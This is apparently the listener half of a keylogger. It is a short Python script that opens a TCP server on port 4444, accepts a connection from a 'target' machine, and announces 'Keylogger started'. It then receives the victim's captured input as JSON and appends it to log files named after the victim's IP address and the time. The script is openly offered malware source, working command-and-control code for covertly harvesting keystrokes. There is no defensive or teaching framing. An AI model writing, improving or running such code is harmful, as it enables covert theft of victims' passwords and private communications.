#!/usr/bin/env python3

# Made by Skajp

import socket, json, os, datetime


host = '0.0.0.0'
port = 4444

if not os.path.exists("./logs"):
    os.makedirs('logs')

def reliable_recv():
	data = ''
	while True:
		try:
			data = data + target.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue

def target_communication():
    timen = datetime.datetime.now().strftime('%Hh %Mm %Ss')
    while True:
        result = reliable_recv()
        print(result)
        with open(f"./logs/log-{ip[0]}[{timen}].txt", "a") as f:
            f.write(f"{result}\n")


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen()

target, ip = server.accept()
print(f" [+] Target Connected: {str(ip)} " )
print(" [!] Keylogger started...\n")
target_communication()